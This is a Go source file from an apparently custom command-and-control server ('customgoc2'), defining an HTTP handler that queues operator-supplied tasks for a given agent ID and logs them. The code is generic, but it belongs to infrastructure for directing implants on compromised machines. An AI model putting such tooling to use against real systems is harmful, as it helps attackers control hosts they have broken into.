package routes

import (
	"io"
	"log"
	"net/http"
	"strings"

	"customgoc2/data"
)

func HandleTask(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	agentID := strings.TrimPrefix(r.URL.Path, "/task/")
	if agentID == "" {
		http.Error(w, "Agent ID missing", http.StatusBadRequest)
		return
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Failed to read task", http.StatusInternalServerError)
		return
	}

	task := string(body)
	data.Store.QueueTask(agentID, task)
	log.Printf("[+] Queued task for %s: %s\n", agentID, task)

	w.WriteHeader(http.StatusOK)
	w.Write([]byte("Task added"))
}
